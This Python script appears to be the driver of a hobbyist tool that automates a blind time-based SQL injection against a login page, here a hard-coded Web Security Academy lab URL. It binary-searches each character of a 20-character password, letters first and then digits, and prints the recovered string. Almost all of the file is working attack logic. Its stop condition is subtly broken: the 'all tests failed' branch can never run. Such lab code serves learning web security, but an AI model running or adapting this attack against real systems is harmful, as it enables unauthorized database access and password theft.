from src.payload_and_stuff import sending_payload_for_time_based_SQLi
import sys
from colorama import Fore, Style
from src.info_message import output_message, warning_message, successful_message
from src.binary_search import  binary_search_for_blind_sqli
from src.info_message import welcome_message

"""  
    Here we have the main programm for a blind time-based SQLi. We using the binary search for blind SQLi and the sending_payload
    for the time-based SQLi. 
    
    The only thing you need to worry about is the cookies. If in your case you don't need it, don't touch the cookie inside the function.

"""

def get_password_with_blind_timed_based_SQLi():
    """Welcome message :) """
    welcome_message()
        
    #Initialisation of variable
    indice = 1 #use to change the indice of the password 
    liste = [] #list all the found character 
    success = True 
    while indice <= 20: #we assume that the password have 20 character
        if success: #initialisation of all variable used during the process
            letter = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
            low_bound = 0
            high_bound = 25
            mid_point = 13
            marquage = 'lettre'
            operator1 = '>'
            operator2 = '='
            payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
            payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
            success = False
            
        """Here we sending the payload with the initialized parameter only if success = True """
        
        url = 'https://0a11003a049c59c782385b0800c2003d.web-security-academy.net/login'
        output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
        output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
        output_message(f"[++] Index number : {indice}")
        result_bool, result_control = sending_payload_for_time_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
        #this print is for the verbose, to understand what is it, refer to the 'sending_payload_for_time_based_SQLi' function
        print(f"Result_bool: {result_bool}, Result_control: {result_control}\n")

        
        """We will make a binary search craft specialy for this kind of attack"""
        
        while low_bound <= high_bound:
            try:
                high_bound,low_bound,mid_point = binary_search_for_blind_sqli(result_bool, operator1, high_bound, low_bound, mid_point)
                
                """The result_control will say if the payload parameter is correct, if it's the case, we change the index"""
                
                if result_control== True:
                    success = True
                    successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
                    indice +=1
                    match marquage:#the purpose here is to print correctly the working 
                        case "chiffre":
                            liste.append(str(mid_point))
                        case "lettre":
                            liste.append(str(letter[mid_point]))
                    break
            except Exception as e:
                print(f"error during binary search {e}")
             
            """We change the binary_average in order to search the best parameter"""
                    
            mid_point = (low_bound+high_bound)//2
            match marquage:
                case 'chiffre':
                    payload_parameter1 = f"{operator1}'{mid_point}'"
                    payload_parameter2 = f"{operator2}'{mid_point}'"
                case 'lettre':
                    payload_parameter1 = f"{operator1}'{letter[mid_point]}'"
                    payload_parameter2 = f"{operator2}'{letter[mid_point]}'"
                    
            """We send a packet with the new craft payload and see if it work"""
                    
            output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
            output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
            output_message(f"[++] Index number : {indice}")
            result_bool, result_control = sending_payload_for_time_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
            print(f"[**] Result_bool: {result_bool}, Result_control: {result_control}\n")

            
            if result_control == True:
                success = True
                successful_message(f"Succesfull payload with {payload_parameter2} parameter !!! ")
                indice +=1
                
                """Here we match the marquage to the good term in order to print the correct parameter to the user"""
                
                match marquage:
                    case "chiffre":
                        liste.append(str(mid_point))
                    case "lettre":
                        liste.append(str(letter[mid_point]))
                break
            
        """Here the part where we change letters to numbers"""
           
        if low_bound > high_bound:  
            low_bound, high_bound = 0, 10 
            mid_point = (low_bound+high_bound)//2
            marquage = 'chiffre'
            print(Fore.MAGENTA + "Move on to the numbers test.\n" + Style.RESET_ALL)
            success = False
            payload_parameter1 = f"{operator1}'{mid_point}'"
            payload_parameter2 = f"{operator2}'{mid_point}'"
        
        #in case if the letters and the numbers don't work, we stop the programm. 
                        
        elif low_bound > high_bound and marquage == 'chiffre':
            warning_message("All tests failed :( ")
            break
            
        print(Fore.YELLOW + f"Payload result... {''.join(liste)}\n\n" + Style.RESET_ALL)
        
        
if __name__=='__main__':
    get_password_with_blind_timed_based_SQLi()
